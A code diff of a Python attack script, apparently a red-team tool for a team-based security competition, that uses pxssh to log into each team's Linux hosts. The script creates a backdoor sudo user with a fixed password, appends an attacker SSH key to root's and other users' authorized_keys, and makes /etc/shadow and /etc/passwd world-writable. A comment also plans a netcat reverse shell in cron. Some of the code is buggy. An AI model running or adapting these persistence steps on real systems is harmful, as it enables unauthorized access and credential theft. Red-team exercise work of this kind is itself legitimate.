@@ -33,7 +33,7 @@ def main():
     teams_numbers = range(1,3)
     teams = []
 
-    base_ip = [172, 31, 20, 0]
+    base_ip = [172, 25, 20, 0]
 
     for i in teams_numbers:
         teams.append(Team(i))
@@ -42,11 +42,11 @@ def main():
     for team in teams:
         print(team.number)
 
-        print(team.ubuntu.ip)
+        print(team.ubuntu)
         universal_linux_attack(team.ubuntu.ip)
-        print(team.centos.ip)
+        print(team.centos)
         universal_linux_attack(team.centos.ip)
-        print(team.pfsense.ip)
+        print(team.pfsense)
 
 def get_ssh_pub():
     home = expanduser("~")
@@ -65,24 +65,31 @@ def pfsense_attacks(host):
     pass
 
 def universal_linux_attack(host):
+    
+    
+    print("Creating SSH session on {}.".format(host.ip))
+    # Create SSH session
+    ssh = pxssh.pxssh()
+    ssh.login(host.ip, host.username, password=host.password)
+    ssh.prompt()
+    
     # add user
     username = "tom"
     password = "hunter2"
     user_add_cmd = "useradd -m -d /home/{0}/ -s /bin/bash {0}".format(username)
     user_passwd_cmd = "echo -e {1}\n{1} | sudo passwd {0}".format(username, password)
-    
-    ssh = pxssh.pxssh()
-    ssh.login(host.ip, host.username, password=host.password)
-    ssh.prompt()
+    print("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip))
     ssh.sendline(user_add_cmd)
     ssh.prompt()
     ssh.sendline(user_passwd_cmd)
 
     # add user to sudoers
+    print("Adding user {0} to sudoers on {1}.".format(username, host.ip))
     sudo_add_cmd = "usermod -a -G admin {0}} || usermod -a -G wheel {0}".format(username)
     ssh.prompt()
     ssh.sendline(sudo_add_cmd)
 
+    
     # Add SSH keys
     user_directory = {
         "root" : "/root",
@@ -94,10 +101,12 @@ def universal_linux_attack(host):
     for user, directory in user_dirs.items():
         sshdir_make_cmd = "mkdir -p {}".format(directory)
         sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{0} {1}".format(user, directory)
-
+        
         authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)
 
         ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)
+
+        print("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip))
         authorized_perms_cmd = "chmod 600 {1} && chown {0}:{0} {1}".format(user, authorized_keys_file)
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
@@ -105,19 +114,23 @@ def universal_linux_attack(host):
         for command in commands_to_run:
             ssh.promt()
             ssh.sendline(command)
+    
+    
     # ez mode /etc/shadow
     shadow_perms_cmd = "chmod 777 /etc/shadow"
     ssh.prompt()
+    print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
     ssh.sendline(shadow_perms_cmd)
     # ez mode /etc/passwd
-    shadow_perms_cmd = "chmod 777 /etc/passwd"
+    passwd_perms_cmd = "chmod 777 /etc/passwd"
     ssh.prompt()
-    ssh.sendline(shadow_perms_cmd)
+    print("Setting permissions to 777 on /etc/shadow on {}".format(host.ip))
+    ssh.sendline(passwd_perms_cmd)
 
     # add netcat shell to cron
     netcat_port = "1{}{}".format(host.team, host.last_octet)
     # https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script
-    pass
+    ssh.close()
 
 
 def ubuntu_attacks(host):
